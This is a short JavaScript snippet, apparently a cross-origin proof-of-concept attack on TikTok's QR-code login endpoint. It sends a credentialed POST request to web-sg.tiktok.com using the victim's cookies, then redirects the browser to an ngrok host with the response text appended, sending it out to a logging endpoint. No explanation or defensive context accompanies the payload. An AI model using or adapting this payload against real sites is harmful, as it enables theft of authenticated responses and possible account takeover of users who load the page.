var xhr = new XMLHttpRequest();
var params = 'orem=ipsum&name=binny';
xhr.onload = reqListener; 
xhr.open("POST", "https://web-sg.tiktok.com/passport/web/scan_qrcode/?request_tag_from=h5&manifest_version_code=2021304040&_rticket=1690826456358&current_region=ID&app_language=en&app_type=normal&iid=7261984380745287429&channel=googleplay&device_type=ASUS_X01BDA&language=en&locale=en&resolution=1080*2073&openudid=edc3a3c1f76c1a6a&content_language=en%2Cid%2C&update_version_code=2021304040&ac2=wifi&sys_region=US&os_api=30&uoo=0&is_my_cn=0&timezone_name=Asia%2FJakarta&dpi=420&residence=ID&carrier_region=ID&ac=wifi&device_id=7037878975121802758&pass-route=1&mcc_mnc=51011&os_version=11&timezone_offset=25200&version_code=130404&carrier_region_v2=510&app_name=musical_ly&ab_version=13.4.4&version_name=13.4.4&device_brand=asus&ssmix=a&pass-region=1&device_platform=android&build_number=13.4.4&region=US&aid=1233&ts=1690826454");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send(params);

function reqListener() {
    location='//e5cc-202-162-37-174.ngrok-free.app/log?key='+this.responseText; 
};
